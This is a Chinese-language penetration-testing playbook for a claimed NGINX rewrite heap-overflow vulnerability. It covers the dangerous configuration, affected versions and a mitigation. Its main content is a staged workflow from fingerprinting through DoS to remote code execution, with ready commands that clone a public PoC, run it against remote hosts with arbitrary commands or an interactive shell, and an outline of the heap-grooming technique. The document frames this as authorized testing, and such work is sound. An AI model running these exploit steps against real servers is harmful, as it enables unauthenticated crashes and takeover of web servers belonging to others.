> **CWE**：CWE-122（堆溢出）/ CWE-131（缓冲区大小计算错误）

## 一、一句话

`rewrite` 替换串含 `?`，且同 location 后续还有带**未命名 PCRE 捕获**（`$1`/`$2`…）的 `rewrite`/`if`/`set` 时，脚本引擎两遍执行（算长 vs 拷贝）对 `is_args` 处理不一致 → 堆分配过小 → 未认证请求可打崩 worker；无 ASLR / 能绕 ASLR 时可 RCE。

---

## 二、触发配置（真源：F5 K000161019）

**危险形态**（示例）：

```nginx
location / {
    rewrite ^/old/(.*)$ /new?upgrade=1;
    set $orig $1;
}
```

要点：

1. 某条 `rewrite` 的**替换串含 query 边界 `?`**
2. **同一 location** 内后续还有 `rewrite` / `if` / `set`
3. 后续指令用到**未命名捕获** `$1` `$2` …

**配置缓解**（升不了版本时）：改用**命名捕获**，去掉未命名 `$n`：

```nginx
location / {
    rewrite ^/old/(?<path>.*)$ /new?upgrade=1;
}
```

## 三、影响版本（F5 公告）

| 产品 | 受影响 | 修复 |
|------|--------|------|
| NGINX Open Source | `0.6.27` ~ `1.30.0` | **`1.30.1`** / **`1.31.0`**+ |
| NGINX Plus | R32–R36（未打补丁点） | **R36 P4** / **R32 P6**；R37.0.0 起 |
| Ingress / Gateway Fabric / NAP 等 | 见 F5 表（多数吃底座 NGINX） | 跟发行版补丁 |

覆盖面极大，但**必须配置命中**才可远程触发；仅 `Server: nginx` ≠ 必可打。

## 四、作业口径（授权范围内 L1→L4 全开）

目标已在 `授权范围` 时，**允许推进到 L3/L4**。破坏性步骤写进 STATUS，生产站先评估 worker 崩溃影响。

| 级别 | 条件 | 成功口径 | 入口 |
|------|------|----------|------|
| L1 指纹 | `Server: nginx[/x.y.z]`，版本 ∈ 受影响区间 | `detect.json` risk=`affected` | `nginx_rift_probe.py detect` |
| L2 配置面 | 危险 rewrite 链可证实 | `config_audit.json` `vulnerable_config_likely=true` | `check-config` / 源站配置 |
| L3 DoS | 授权目标上触发 worker 重启 / 间歇 502 | error log 或连接抖动可复现 | 外置 PoC / lab；见 §五 Step 4 |
| L4 RCE | 堆风水 + cleanup→`system()`（lab 默认定址；有 ASLR 需另链） | 命令执行证据（文件/回显/会话） | 外置 `poc.py`；见 §五 Step 5 |

根因摘要：拷贝遍因 `?` 置 `is_args` 并 `ngx_escape_uri`（最长约 3×），长度遍子引擎 `is_args=0` → 分配过小。利用侧：跨请求堆风水，POST body 喷假结构，打翻邻接 `ngx_pool_t.cleanup` → pool 销毁时调 `system()`。

## 五、作业步骤与入口命令

### Step 0：Scope

```bash
# 确认已在授权总表（没有则先写 scope_sites 并并入 company）
python3 -c "import json;print([t.get('domain',t) for t in json.load(open('授权范围'))['targets']][-5:])"
```

### Step 1：L1 指纹 + 版本

```bash
CASE=案卷/<案卷>/案卷/nginx_rift

python3 炼蛊房/nginx_rift_probe.py detect -u https://授权目标 \
  --out "$CASE"

# 或 nuclei
nuclei -u https://授权目标 \
  -t tools/1day-kit/custom-templates/nginx-rift-cve-2026-42945.yaml \
  -o "$CASE/nuclei.txt"
```

判定：无版本 → 旁证；`≤1.30.0` 且 `≥0.6.27` → L1；`1.30.1+` → 官方修复线。

### Step 2：改写面粗扫

```bash
python3 炼蛊房/nginx_rift_probe.py surface -u https://授权目标 \
  --out "$CASE"
```

### Step 3：L2 配置审计

```bash
python3 炼蛊房/nginx_rift_probe.py check-config -f /path/to/nginx.conf \
  --out "$CASE"

# L1+L2 一键
python3 炼蛊房/nginx_rift_probe.py scan -u https://授权目标 \
  --out "$CASE"
```

### Step 4：L3 / L4 — 拉取外置 PoC（不 vendor 进 tools/）

```bash
# 首次：克隆披露方复现环境到 poc-db（勿 commit 大镜像层）
mkdir -p poc-db
git clone --depth 1 https://github.com/DepthFirstDisclosures/Nginx-Rift.git \
  poc-db/nginx-rift

cd poc-db/nginx-rift/Nginx-Rift
./setup.sh
docker compose -f env/docker-compose.yml up -d
# lab 默认：127.0.0.1:19321
```

**L3（lab 上证可达 / worker 异常）**：对 lab 打 PoC；观察容器内 nginx worker 重启、请求中断。生产授权站做 L3 前在 STATUS 注明「接受 DoS」。

**L4（lab RCE — 官方入口）**：

```bash
cd poc-db/nginx-rift/Nginx-Rift

# 执行命令
python3 poc.py --cmd 'echo hello from nginx-rift > /tmp/pwned'
docker compose -f env/docker-compose.yml exec nginx cat /tmp/pwned

# 交互 shell
python3 poc.py --shell
```

**L4（授权远程目标）**：

```bash
cd poc-db/nginx-rift/Nginx-Rift
# 先读 poc.py -h；按目标改 host/port/rewrite 路径；
# lab 脚本含定址假设（HEAP/LIBC），开 ASLR 的生产机通常要额外泄露链才能稳 RCE。
python3 poc.py --help
python3 poc.py --host <授权IP或源站> --port <端口> --cmd 'id > /tmp/rift_pwned'
```

> 参数以当次仓库 `poc.py --help` 为准；上游若改 CLI，以 clone 内 README 为准。  
> 有 ASLR + 无泄露时：优先记 L3（崩溃可达），RCE 标「需信息泄露/关闭 ASLR」勿虚报 L4。

证据拷贝：

```bash
mkdir -p "$CASE/l3_l4"
cp -a poc-db/nginx-rift/Nginx-Rift/*.log "$CASE/l3_l4/" 2>/dev/null || true
# 将命令输出、/tmp/pwned 内容、worker 重启时间线写入 STATUS / REPORT
```

## 七、不要做

- 未授权扫网段 / 把报告里的无关域名扩进 scope  
- 只扫到 `Server: nginx` 就写「已 RCE」  
- 开 ASLR 且无泄露时虚报 L4  
- 把完整第三方 exploit **硬 vendor** 进 `tools/`（放 `poc-db/nginx-rift/`，gitignore 大产物）  
- 生产 L3/L4 不写 STATUS、不评估可用性影响
